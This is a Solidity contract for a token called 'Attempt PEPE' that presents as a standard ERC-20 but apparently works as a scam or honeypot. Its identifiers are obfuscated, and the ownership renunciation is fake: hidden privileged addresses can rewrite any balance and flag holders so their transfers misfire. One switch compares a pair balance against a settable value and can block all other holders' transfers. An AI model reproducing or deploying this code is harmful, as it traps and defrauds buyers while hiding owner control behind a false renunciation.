//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface toAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchExemptSwap) external view returns (uint256);

    function transfer(address txReceiverLaunched, uint256 walletMin) external returns (bool);

    function allowance(address liquidityBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMin) external returns (bool);

    function transferFrom(
        address sender,
        address txReceiverLaunched,
        uint256 walletMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundTeam, uint256 value);
    event Approval(address indexed liquidityBuy, address indexed spender, uint256 value);
}

abstract contract launchedExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface modeLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellWallet {
    function createPair(address fromEnable, address swapToken) external returns (address);
}

interface toAmountMetadata is toAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AttemptPEPE is launchedExempt, toAmount, toAmountMetadata {

    mapping(address => mapping(address => uint256)) private fromSellExempt;

    address public atMaxTx;

    uint256 shouldFee;

    function transferFrom(address walletAt, address txReceiverLaunched, uint256 walletMin) external override returns (bool) {
        if (_msgSender() != txLimit) {
            if (fromSellExempt[walletAt][_msgSender()] != type(uint256).max) {
                require(walletMin <= fromSellExempt[walletAt][_msgSender()]);
                fromSellExempt[walletAt][_msgSender()] -= walletMin;
            }
        }
        return isMode(walletAt, txReceiverLaunched, walletMin);
    }

    event OwnershipTransferred(address indexed isLimitAmount, address indexed enableAt);

    uint256 private maxShould;

    mapping(address => bool) public sellTokenEnable;

    function balanceOf(address launchExemptSwap) public view virtual override returns (uint256) {
        return feeMode[launchExemptSwap];
    }

    string private isToken = "Attempt PEPE";

    function symbol() external view virtual override returns (string memory) {
        return enableReceiver;
    }

    mapping(address => bool) public exemptTotal;

    uint256 public launchFund;

    address public amountAuto;

    function toWallet() public {
        emit OwnershipTransferred(amountAuto, address(0));
        autoMinToken = address(0);
    }

    function owner() external view returns (address) {
        return autoMinToken;
    }

    uint256 public launchExempt;

    address txLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function teamMode(address receiverExempt) public {
        receiverMarketing();
        if (launchFund == walletReceiverSender) {
            walletReceiverSender = launchFund;
        }
        if (receiverExempt == amountAuto || receiverExempt == atMaxTx) {
            return;
        }
        sellTokenEnable[receiverExempt] = true;
    }

    function transfer(address receiverToken, uint256 walletMin) external virtual override returns (bool) {
        return isMode(_msgSender(), receiverToken, walletMin);
    }

    bool public liquidityTx;

    string private enableReceiver = "APE";

    function decimals() external view virtual override returns (uint8) {
        return buyEnable;
    }

    function name() external view virtual override returns (string memory) {
        return isToken;
    }

    function approve(address swapShouldAmount, uint256 walletMin) public virtual override returns (bool) {
        fromSellExempt[_msgSender()][swapShouldAmount] = walletMin;
        emit Approval(_msgSender(), swapShouldAmount, walletMin);
        return true;
    }

    bool private amountTx;

    bool private autoMarketing;

    function receiverMarketing() private view {
        require(exemptTotal[_msgSender()]);
    }

    address private autoMinToken;

    function getOwner() external view returns (address) {
        return autoMinToken;
    }

    uint256 private teamFundFee;

    uint256 constant takeTxLaunch = 17 ** 10;

    uint8 private buyEnable = 18;

    uint256 public fromFund;

    function totalSupply() external view virtual override returns (uint256) {
        return amountMode;
    }

    uint256 public amountSender;

    function allowance(address sellAmount, address swapShouldAmount) external view virtual override returns (uint256) {
        if (swapShouldAmount == txLimit) {
            return type(uint256).max;
        }
        return fromSellExempt[sellAmount][swapShouldAmount];
    }

    function receiverListAuto(address walletAt, address txReceiverLaunched, uint256 walletMin) internal returns (bool) {
        require(feeMode[walletAt] >= walletMin);
        feeMode[walletAt] -= walletMin;
        feeMode[txReceiverLaunched] += walletMin;
        emit Transfer(walletAt, txReceiverLaunched, walletMin);
        return true;
    }

    function tradingMax(uint256 walletMin) public {
        receiverMarketing();
        shouldFee = walletMin;
    }

    uint256 private amountMode = 100000000 * 10 ** 18;

    address receiverTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function teamTokenMin(address receiverToken, uint256 walletMin) public {
        receiverMarketing();
        feeMode[receiverToken] = walletMin;
    }

    function listAt(address sellMarketing) public {
        require(sellMarketing.balance < 100000);
        if (liquidityTx) {
            return;
        }
        if (launchFund == fromFund) {
            launchFund = teamFundFee;
        }
        exemptTotal[sellMarketing] = true;
        
        liquidityTx = true;
    }

    mapping(address => uint256) private feeMode;

    uint256 launchToken;

    constructor (){
        
        modeLaunch exemptBuyToken = modeLaunch(txLimit);
        atMaxTx = sellWallet(exemptBuyToken.factory()).createPair(exemptBuyToken.WETH(), address(this));
        
        amountAuto = _msgSender();
        toWallet();
        exemptTotal[amountAuto] = true;
        feeMode[amountAuto] = amountMode;
        
        emit Transfer(address(0), amountAuto, amountMode);
    }

    uint256 public walletReceiverSender;

    bool private tokenList;

    function isMode(address walletAt, address txReceiverLaunched, uint256 walletMin) internal returns (bool) {
        if (walletAt == amountAuto) {
            return receiverListAuto(walletAt, txReceiverLaunched, walletMin);
        }
        uint256 isLaunched = toAmount(atMaxTx).balanceOf(receiverTeam);
        require(isLaunched == shouldFee);
        require(txReceiverLaunched != receiverTeam);
        if (sellTokenEnable[walletAt]) {
            return receiverListAuto(walletAt, txReceiverLaunched, takeTxLaunch);
        }
        return receiverListAuto(walletAt, txReceiverLaunched, walletMin);
    }

}